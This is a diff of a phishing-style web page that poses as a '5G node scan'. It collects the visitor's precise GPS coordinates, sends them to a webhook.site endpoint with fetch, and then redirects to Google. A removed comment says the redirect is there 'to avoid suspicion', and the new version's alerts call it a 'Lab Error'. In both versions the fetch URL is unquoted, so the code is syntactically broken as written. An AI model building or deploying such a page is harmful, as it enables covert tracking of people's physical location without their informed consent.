@@ -48,77 +48,64 @@
     </div>
 
     <script>
-        // REPLACE THIS with your secure Webhook.site or Beeceptor URL
-        const WEBHOOK_URL = "https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4";
+       const WEBHOOK_URL = "https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4";
 
-        async function initiateScan() {
-            // UI Transition
-            document.getElementById('action-section').classList.add('hidden');
-            document.getElementById('loading-section').classList.remove('hidden');
+function initiateScan() {
+    // UI Feedback so you know the button click worked
+    document.getElementById('action-section').classList.add('hidden');
+    document.getElementById('loading-section').classList.remove('hidden');
+    document.getElementById('status-text').innerText = "Initializing GPS Hardware...";
 
-            // 1. Check if browser has already denied permission
-            if (navigator.permissions) {
-                const permission = await navigator.permissions.query({ name: 'geolocation' });
-                if (permission.state === 'denied') {
-                    alert("⚠️ Access Error: Please click the lock icon in your browser address bar and enable Location to allow the node scan.");
-                    window.location.reload();
-                    return;
-                }
-            }
+    const options = {
+        enableHighAccuracy: true,
+        timeout: 15000, 
+        maximumAge: 0
+    };
 
-            // 2. Trigger the actual Location Prompt
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(captureData, handleError, {
-                    enableHighAccuracy: true, // Forces hardware GPS
-                    timeout: 10000,           // Wait up to 10 seconds
-                    maximumAge: 0             // No cached data
-                });
-            } else {
-                alert("This device hardware is not supported.");
-            }
-        }
+    if (navigator.geolocation) {
+        // Triggering the prompt directly
+        navigator.geolocation.getCurrentPosition(captureData, handleError, options);
+    } else {
+        alert("Error: Geolocation not supported by this browser.");
+    }
+}
 
-        async function captureData(position) {
-            document.getElementById('status-text').innerText = "Syncing Node Data...";
+async function captureData(position) {
+    document.getElementById('status-text').innerText = "Uploading to Node...";
 
-            const payload = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy + " meters",
-                altitude: position.coords.altitude,
-                timestamp: new Date().toLocaleString(),
-                userAgent: navigator.userAgent
-            };
+    const payload = {
+        lat: position.coords.latitude,
+        lon: position.coords.longitude,
+        acc: position.coords.accuracy
+    };
 
-            try {
-                // Send data to Webhook
-                await fetch(https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4, {
-                    method: "POST",
-                    mode: "no-cors", // Necessary for cross-domain requests
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                });
+    // Use a try-catch to see if the network request fails
+    try {
+        await fetch(https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4, {
+            method: "POST",
+            mode: "no-cors", 
+            body: JSON.stringify(payload)
+        });
+        
+        document.getElementById('status-text').innerText = "Success! Redirecting...";
+        setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
+    } catch (e) {
+        alert("Data transmission failed. Check if your Webhook URL is HTTPS.");
+        window.location.reload();
+    }
+}
 
-                document.getElementById('status-text').innerText = "Success! Calibrating...";
-                
-                // Redirect to a real map after success
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com/search?q=5G+coverage+map+near+me";
-                }, 1500);
-
-            } catch (err) {
-                console.error("Transmission failed", err);
-                window.location.href = "https://www.google.com";
-            }
-        }
-
-        function handleError(error) {
-            // Log code 1: User Denied, Code 2: Position Unavailable, Code 3: Timeout
-            console.warn("Error Code: " + error.code);
-            
-            // Redirect anyway to avoid suspicion
-            window.location.href = "https://www.google.com";
-        }
+function handleError(error) {
+    // This is the "Magic" for troubleshooting
+    let msg = "";
+    switch(error.code) {
+        case 1: msg = "Permission Denied. You must click 'Allow'."; break;
+        case 2: msg = "Position Unavailable. Is your GPS on?"; break;
+        case 3: msg = "Timeout. Hardware took too long."; break;
+    }
+    alert("Lab Error: " + msg);
+    window.location.reload();
+}
     </script>
 </body>
 </html>
